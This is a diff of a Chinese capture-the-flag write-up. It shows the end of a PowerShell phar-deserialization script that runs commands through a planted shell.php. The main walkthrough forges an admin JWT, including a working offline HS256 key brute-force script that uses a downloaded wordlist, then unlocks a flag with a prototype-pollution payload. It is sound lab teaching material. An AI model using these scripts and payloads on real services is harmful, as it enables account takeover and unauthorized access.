@@ -2139,7 +2139,7 @@ for ($i = 0; $i -lt 50; $i++) {
             if ($oldFiles -notcontains $name) {
                 Write-Host "[$i] 发现新文件: $name，立刻触发！"
                 
-                # ★ 一发现就立刻触发 phar://
+                # 一发现就立刻触发 phar://
                 try {
                     $trig = Invoke-WebRequest -Uri "$base/index.php?file=phar://uploads/$name.gif/x" -UseBasicParsing -TimeoutSec 5
                     Write-Host "触发结果: $($trig.Content)"
@@ -2165,7 +2165,7 @@ Start-Sleep -Milliseconds 500
 Write-Host "`n=== 检查 shell.php ==="
 try {
     $sh = Invoke-WebRequest -Uri "$base/shell.php" -Method Post -Body "cmd=system('cat /flag');echo END;" -UseBasicParsing -TimeoutSec 10
-    Write-Host "flag 拿到了!"
+    Write-Host "flag 拿到"
     Write-Host $sh.Content
 } catch {
     Write-Host " shell.php 还没好，多跑几次这个脚本"
@@ -2173,12 +2173,389 @@ try {
 ```
 ![alt text](image-36.png)
 
-
+---
 ## 大蒜哥
-### 1.源码
-`gta6Endpoint`真正发 flag 的接口路径，**app.js 里完全没有**，只有特权脚本里才有`gta6Entitlement`一个声明了却从没被使用的权益名 —— 审计里的 “死代码提示”，告诉你服务端在校验这个字段`["一男一女","one-man-one-woman",false]`锁定状态的那款游戏，`false` 就是我要绕的那个 `unlocked`
-![alt text](image-38.png)
-![alt text](image-40.png)
-![alt text](image-39.png)
-![alt text](image-41.png)
-![alt text](image-42.png)
+### 1.点开后，发现是登陆界面，没有有效信息，先用bp抓包看一下
+##### 1.打开bp，抓包
+![alt text](image-44.png)
+![alt text](image-45.png)
+![alt text](image-46.png)
+**从中我们可以看到，自己的token和身份（游客）**
+##### token字段应该是base64加密的密文字段，先解密看看里面有什么
+![alt text](image-47.png)
+### 2.JWT(bp插件)
+因为身份绑定在 token 的 `uid` 上、而 token 的完整性由 HS256 密钥保护，所以要提权必须先拿到这把密钥，再用它重签 ——JWT Editor 只能让 "重签" 这件事不出错，且更简单。
+![alt text](image-48.png)
+##### 1.因为首页有出现u=1，所以将我的uid换成1
+<font color="red">因为 `uid` 从 2333 起顺序自增，说明 1~2332 是**预置账号**，1 号是最早建的，也就是站主。加首页那行 `#001`，指向同一个数。
+
+这一步是**假设**，所以它必须被验证 —— 验证点就在后面的 `GET /api/vault`：只有返回 `"mode":"owner"` 才算猜对；返回 visitor 就得换数（2、3…）。
+</font>
+
+##### 2.改后返回401，证明："改数据不重签" 被打回
+![alt text](image-49.png)
+##### 2.将JWT中改好的
+```
+eyJ1c2VybmFtZSI6IjEyMzQ1IiwidWlkIjoxLCJpYXQiOjE3OTQ2NTI4NzMsImV4cCI6MTc5NDY2MDA3MywiaXNzIjoiZ2FybGljLXByaXZhdGUtc2VydmVyIn0
+```
+复制到
+![alt text](image-50.png)
+## JWT 的三段是硬性格式
+
+```
+header . payload . signature
+  ↓        ↓         ↓
+算法      数据      签名
+```
+- `uid` → 我是谁（**服务端真正查库用的就是这个**）
+- `exp` → 什么时候过期
+- `iss` → 谁签发的
+
+而这一段是**明文 base64，不是加密**：任何人都能读、能改。所以 JWT 的安全性**完全压在第 3 段的签名上**—— 签名证明了 "这段数据没被人动过"。
+
+<font color="red">也就是说：第 2 段负责 "声明我是谁"，第 3 段负责 "证明这个声明是真的"。两个一起才成立。
+后面要做的就是把这两条串起来：**改第 2 段的 uid=1（声明成管理员）+ 用爆出来的密钥补上合法第 3 段（证明它是真的）**—— 两者齐了，服务端才认。</font>
+清除一下签名，看看服务器端会不会校验
+![alt text](image-51.png)
+| 测试 | 构造 | 结果 |
+| --- | --- | --- |
+| A | 改 `uid=1`，**保留原签名** | 401 |
+| B | `alg:none`，**签名清空** | 401 对 |
+
+由此**排除**两条便宜的路：
+
+1. **"服务端不验签"** → 排除。否则 A 会直接 200 owner，根本不用爆密钥；
+2. **"算法可降级到 none"** → 排除。服务端有算法白名单。
+
+**最后只剩一条**：
+
+<font color="red">必须用**服务端那把真实密钥**，按 HS256 算出正确签名。</font>
+先下载一个常见弱密钥字典
+```php
+1.先 $token = '<粘贴 /api/login 返回的原始 token，uid 是 2333 那条，不是改过的>'
+
+2.再 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list' -OutFile "$env:TEMP\jwt.secrets.list"
+$parts = $token.Split('.')
+$data  = "$($parts[0]).$($parts[1])"
+$sig   = $parts[2]
+$utf8  = [Text.Encoding]::UTF8
+$dict  = Get-Content -LiteralPath "$env:TEMP\jwt.secrets.list" -Encoding utf8
+$sw = [Diagnostics.Stopwatch]::StartNew()
+$hit = $null
+foreach ($k in $dict) {
+  if ([string]::IsNullOrWhiteSpace($k)) { continue }
+  $h    = [System.Security.Cryptography.HMACSHA256]::new($utf8.GetBytes($k))
+  $calc = [Convert]::ToBase64String($h.ComputeHash($utf8.GetBytes($data))).TrimEnd('=').Replace('+','-').Replace('/','_')
+  if ($calc -eq $sig) { $hit = $k; break }
+}
+$sw.Stop()
+"命中: [$hit]  耗时: $($sw.ElapsedMilliseconds) ms  字典条数: $($dict.Count)"
+```
+
+### 3.爆破跑完：先确认密钥是真的
+
+跑完终端会吐出一行（字典 103978 条，我这台机器实测约 3 秒）：
+
+```text
+命中: [xxx]  耗时: 2987 ms  字典条数: 103978
+```
+
+**<font color="red">判据只有一条：用命中的这条密钥重算 `header.payload` 的 HMAC-SHA256，得到的结果与 token 第三段逐字符完全相同。</font>** 不是"看着像"、不是"长度对"，是全等。全等了才叫确认，否则只是"猜中了个可疑值"。
+
+顺手记一下为什么不用 Burp 爆破：
+
+| | 本地离线算 | Burp Intruder |
+|---|---|---|
+| 10 万条耗时 | 约 3 秒（实测） | 几十分钟起 |
+| 网络开销 | 0 请求 | 10 万次请求 |
+| 判据 | 签名数学全等，二值 | 只能靠响应长度差猜 |
+| 风险 | 无 | 限流、告警、token 中途过期 |
+
+<font color="red">原理：JWT 前两段是明文，签名只是密钥的确定性函数。只要我手上有一条"明文 + 正确签名"的真实 token，就能在本地试任意候选密钥，全程不需要服务器参与。</font>
+
+> **名词：HMAC-SHA256** —— 用一把密钥对一段数据做哈希，输出 256 位摘要。同一把密钥 + 同一段输入，永远得到同一个结果；换一个字节，结果面目全非。正因为它是确定性的，我才能在本地"验密钥对不对"，不用问服务器。
+>
+> 这类 6 位纯数字重复串（`123123` 这种）之所以会被字典收进去：开发图省事，真实项目里一大把。
+
+---
+
+### 4.拿密钥重签 token（这里有 base64 的坑）
+
+#### 1.先把密钥装进 JWT Editor
+
+`JWT Editor → New Symmetric Key` → 先点 **Generate** → 把 `k` 改成密钥的 base64url 形式。
+
+![alt text](./images/weekly/image-52.png)
+
+> **名词：Symmetric Key（对称密钥）** —— 签名和验签用的是**同一把**密钥。相对的是 RSA/EC 那类非对称：私钥签、公钥验。HS256 的 H 就是 HMAC，属于对称，所以密钥一旦泄露，谁都能签。
+>
+> `Generate` 的作用：它不是帮你选密钥，而是把 `kty / kid / k / alg` 这几个结构字段补齐，让你只改 `k` 一个值。
+
+<font color="red">**为什么 `k` 不能填明文**：JWS 规范（RFC 7518）规定 oct 类型密钥的 `k` 字段，存放的是**密钥字节的 base64url 编码**，不是明文。</font>原因很朴素——JSON 里只能放文本，二进制密钥必须先编码；而 JWT 全篇统一用 base64url。于是：
+
+```text
+密钥 123123  →  base64url  →  MTIzMTIz    ← k 要填这个
+k 直接填 123123                            ← 服务端解出来是错的字节 → 401
+```
+
+自检一条命令（PowerShell）：
+
+```powershell
+[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('你的密钥')).TrimEnd('=')
+```
+
+<font color="blue">注意：jwt.io 的 `VERIFY SIGNATURE` 框相反，要填**明文**；Burp 的 `k` 要 **base64**。两个工具规则反着来，这是最容易搞反的一处。</font>
+
+#### 2.改 payload，再签名
+
+`JSON Web Token` 页签里把 payload 改成：
+
+```json
+{"username":"garlic","uid":1,"iat":<新token的iat>,"exp":<新token的exp>,"iss":"garlic-private-server"}
+```
+
+然后点页签**底部**的 `Sign`：
+
+![alt text](./images/weekly/image-53.png)
+
+- Key：选刚建的那把（截图里显示 `(OCT 48)`，就是我建的那把对称密钥）
+- Algorithm：`HS256`
+- Header Options：保持 `Don't modify header`
+
+> **名词：Don't modify header** —— 签名时不要顺手改 header。如果让扩展去动 `alg` / `kid`，header 变了签名也得跟着变，还可能跟服务端的算法白名单冲突。保持原样最稳。
+>
+> 另外 `iat / exp` 别抄旧 token 的：有效期只有 7200 秒，抄旧的就是"签了一条已经过期的 token"，服务端同样 401。
+
+**三个按钮别混**：
+
+| 按钮 | 作用 |
+|---|---|
+| 底部 `Sign` | **重算签名**（不点它，发出去还是旧签名） |
+| 左上橙色 `Send` | 发请求 |
+| 右下 `Send to Tokens` | 只存进密钥库，不发请求 |
+
+#### 3.我踩的坑：改完 payload 忘了点 Sign
+
+![alt text](./images/weekly/image-54.png)
+
+图里 payload 已经是 `uid:1`，但 `Serialized JWT` 的第三段还是原来那串 —— 服务端当然还认我是游客。
+
+<font color="red">**判据：第三段必须变。**</font> 没变就是没签。
+
+---
+
+### 5.验证：身份真的变成 owner 了吗
+
+```http
+GET /api/vault HTTP/2
+Authorization: Bearer <重签后的 token>
+```
+
+![alt text](./images/weekly/image-55.png)
+
+返回：
+
+```json
+{"mode":"owner","username":"大蒜哥","consoleScript":"/api/admin/console-script"}
+```
+
+<font color="red">**判据：`"mode":"owner"`。** 这一步同时把前面那个假设验证掉了——owner 确实是 `uid=1`。</font>
+
+这里有两条很值钱的信息：
+
+1. <font color="red">我 token 里写的是 `username:"garlic"`，服务端却返回「大蒜哥」→ 说明它是拿 `uid` 去库里查的，**token 里的 username 只是个标签**。</font> 这也解释了之前"把用户名注册成 garlic 也没用"。
+2. 响应里直接把 `consoleScript` 字段送上门 —— 后台脚本的地址，服务端主动告诉我。
+
+**坑（我栽了两次）**：`Authorization` 必须在空行**之上**，否则整行会被当成请求体。
+
+![alt text](./images/weekly/image-60.png)
+
+![alt text](./images/weekly/image-61.png)
+
+| 症状 | 看什么 | 结论 |
+|---|---|---|
+| 401 且 `Content-Length` 正好等于 token 长度 | 请求区的空行分界 | 头掉到 body 里了 |
+| 401 且请求区没有 `JSON Web Token` 页签 | Inspector 里的请求头数量（19 → 13 就少了一条） | `Authorization` 整行丢了 |
+
+---
+
+### 6.枚举后台路由：注意尾斜杠
+
+```http
+GET /api/admin/games/ HTTP/2
+Authorization: Bearer <owner token>
+```
+
+![alt text](./images/weekly/image-56.png)
+
+五款游戏，其中：
+
+```json
+{"title":"一男一女","slug":"one-man-one-woman","unlocked":false}
+```
+
+<font color="red">`unlocked:false` 就是这道题的"锁"——目标是把这一项变成 true。</font>
+
+> **名词：尾斜杠路由（trailing slash）** —— `/api/admin/games` 和 `/api/admin/games/` 在 HTTP 语义里是两个不同路径。Express 默认 `strict routing = false` 时两者等价；但一旦开了严格模式、或路由挂在不同前缀的 Router 上，就可能一个 200 一个 404。**所以枚举时两种写法都要发一次，一个 404 不代表这条路径不存在。**
+>
+> 我这边实测：第一次跑的那个实例，不带斜杠 404、带斜杠 200；后来重开的实例两种都 200。<font color="red">结论不变：两种都试，不凭一次 404 下判断。</font>
+
+**404 的三种形态要分清**：
+
+| 响应 | 含义 |
+|---|---|
+| `{"message":"接口不存在"}` | 应用层兜底：路径真的不存在 |
+| 一整页 HTML 404 | Express 静态兜底：路径不存在 |
+| `401` / `403` | **路由存在**，只是被鉴权拦了 |
+
+---
+
+### 7.读后台脚本，找到真正的入口
+
+```http
+GET /api/admin/console-script HTTP/2
+Authorization: Bearer <owner token>
+```
+
+返回 `200 application/javascript`，一段 `(() => {...})();`，里面就是上面贴的那三个常量：
+
+```js
+const gta6Endpoint    = "/api/admin/gta6/launch";
+const gta6Entitlement = "gta6_play";
+```
+
+<font color="red">为什么这三个值得盯：`gta6Endpoint` 是真正发 flag 的接口，**前端 app.js 里根本没有这个路径**，只有验明 owner 之后服务端才下发；`gta6Entitlement` 声明了却从未被使用，属于"死代码提示"，等于告诉我服务端在校验 `gta6_play` 这个属性。</font>
+
+> 回头看我第一轮审的 `app.js`：
+>
+> ```js
+> script.textContent = await response.text();
+> document.head.appendChild(script);
+> ```
+>
+> 服务端下发脚本、前端直接执行 —— 这道题正是把"真实接口"藏在这个只有 owner 才能拿到的脚本里。审计里那条 H-1（运行时下载并执行任意文本）在这里是有意设计的一环，不是多余写法。
+
+---
+
+### 8.先撞一次：这题有两层校验
+
+```http
+POST /api/admin/gta6/launch HTTP/2
+Authorization: Bearer <owner token>
+Content-Type: application/json
+
+{"game":"gta6","settings":{"quality":"ultra"}}
+```
+
+![alt text](./images/weekly/image-57.png)
+
+`403 {"message":"GTA6 仍处于锁定状态"}`
+
+<font color="red">关键洞察：同一个接口，访客 token 返回「这里只对大蒜哥开放」，owner token 返回「GTA6 仍处于锁定状态」——**两种不同的 403 文案 = 两个独立的校验点**。身份层我已经过了，卡的是第二层权益校验。</font>
+
+| 身份 | 返回 | 说明 |
+|---|---|---|
+| 访客 | `403 这里只对大蒜哥开放` | 第 1 层没过 |
+| owner | `403 GTA6 仍处于锁定状态` | 第 1 层过了，卡第 2 层 |
+
+我先按名字硬塞，全部无效（记一下省得再试）：
+
+| 塞法 | 结果 |
+|---|---|
+| 顶层 `"entitlement":"gta6_play"` | 403 |
+| 顶层 `"entitlements":["gta6_play"]` | 403 |
+| 顶层 `"gta6_play":true` / `"unlocked":true` / `"owned":true` | 403 |
+| `"price":0` | 403 |
+
+<font color="red">说明服务端根本不读请求体顶层，它读的是 `settings` **合并之后**的对象属性。</font>
+
+**坑**：POST 没带 body、或没加 `Content-Type`，返回的是 `400 游戏配置格式错误`，不是 403。
+
+![alt text](./images/weekly/image-58.png)
+
+| 返回 | 原因 |
+|---|---|
+| `400 游戏配置格式错误` | body 没带 / 没加 `Content-Type: application/json` |
+| `403 这里只对大蒜哥开放` | token 没带或掉了 |
+| `404 接口不存在` | 路径拼错 |
+
+---
+
+### 9.原型链污染：把锁从"对象里"挪到"原型上"
+
+先解释三个词，不然 payload 就是抄：
+
+- **原型（prototype）**：JS 里每个对象都有个"父模板"，读属性时自己没有，就顺着 `__proto__` 往上找，一路找到 `Object.prototype` 为止。这条查找路径就叫**原型链**。
+- **`__proto__`**：访问器属性，读写的是「这个对象的原型」。`obj.__proto__ = X` 等于换父模板 / 改父模板上的东西。
+- **`Object.prototype`**：所有普通对象的祖宗。**改它 = 改全局**，之后任何对象读一个自己没有的属性，都会摸到这个值。
+
+<font color="red">服务端大概是这样写的：</font>
+
+```js
+const settings = deepMerge({ quality: "medium" }, req.body.settings);
+if (!settings.gta6_play) return res.status(403).json({ message: "GTA6 仍处于锁定状态" });
+```
+
+`deepMerge` 会递归遍历用户 JSON 的每个键。它没拦 `__proto__` 这个键名，于是实际执行的是：
+
+```js
+target.__proto__.gta6_play = true;   // 改的是 Object.prototype
+```
+
+<font color="red">这一下改的不是 `settings` 这个对象，而是全局的 `Object.prototype`。之后**任何对象**读 `.gta6_play` 都返回 `true`，`if (!settings.gta6_play)` 自然就过了。</font>
+
+payload（只改 body）：
+
+```json
+{"game":"gta6","settings":{"quality":"ultra","__proto__":{"gta6_play":true}}}
+```
+
+![alt text](./images/weekly/image-59.png)
+
+```json
+{"unlocked":true,"title":"一男一女 / GTA6","flag":"SYC{I_ReAlLy_WaNt_To_PlaY_GTA_6}"}
+```
+
+备用写法（有些库会显式过滤 `__proto__` 这个键名）：
+
+```json
+{"game":"gta6","settings":{"quality":"ultra","constructor":{"prototype":{"gta6_play":true}}}}
+```
+
+> 补一个容易忽略的细节：`JSON.parse` 出来的对象里，`"__proto__"` 其实是**普通自有属性**（规范要求 parse 走自己的 defineProperty，不触发 setter）。所以这件事能干成的前提是——服务端用了 `for...in` 递归赋值、或 lodash 老版本 `merge` 这类**会把键当成赋值路径**的合并函数。<font color="red">换句话说：漏洞不在 JSON，在合并函数。</font>
+
+---
+
+### 10.我踩的五个假失败（都像失败，其实是没发出去）
+
+| 现象 | 看什么 | 结论 |
+|---|---|---|
+| 响应像上一次的 | `Date`、`Etag`、`Content-Length` | 改了请求但**没点 Send** |
+| 401，长度≈token 长度 | 请求区空行分界 | `Authorization` 落到 body 里了 |
+| 401，请求区没有 JWT 页签 | 请求头个数 | `Authorization` 整行丢了 |
+| payload 改了没效果 | `Serialized JWT` 第三段 | **没点 Sign** |
+| `400 游戏配置格式错误` | 有没有 `Content-Type`、空行下有没有 body | 缺 body 或缺头 |
+
+<font color="red">这五个全部能用响应头和结构判死，不需要靠猜——这是我这一轮最大的收获。</font>
+
+---
+
+### 11.知识点小结
+
+| 考点 | 要点 |
+|---|---|
+| JWT 结构 | `header.payload.signature`，前两段只是 base64url，**可读可改不可信** |
+| 验签前置判断 | 改 payload 不重签 → 401，说明必须搞密钥；`alg:none` → 401，说明算法白名单生效 |
+| 爆密钥 | 离线 HMAC 比对，判据是**签名逐字符相等**；10 万条约 3 秒 |
+| `k` 字段 | 存的是**密钥字节的 base64url**，不是明文（和 jwt.io 的 secret 框相反） |
+| 身份锚点 | 权限按 `uid` 查库，token 里的 `username` 只是标签 |
+| 尾斜杠 | `/a` 与 `/a/` 可能行为不同，枚举时两种都发 |
+| 两级 403 | **两种不同文案 = 两个校验点**，先定层，再想办法 |
+| 原型链污染 | `__proto__` 交给深层 merge → 污染 `Object.prototype` → 任意对象读到 true |
+| 判据优先 | "过没过"一律看状态码 / 长度 / 第三段是否变化，不靠感觉 |
+
+<font color="red">一句话总结：**弱密钥让"我是谁"变成可选项，特权脚本把"下一步打哪"写给我，原型链污染把"有没有权益"从对象里挪到全局去。** 三层都不是单点绕过，是串起来才通的。</font>
+
+----
+## ISCTF
+### Break Here
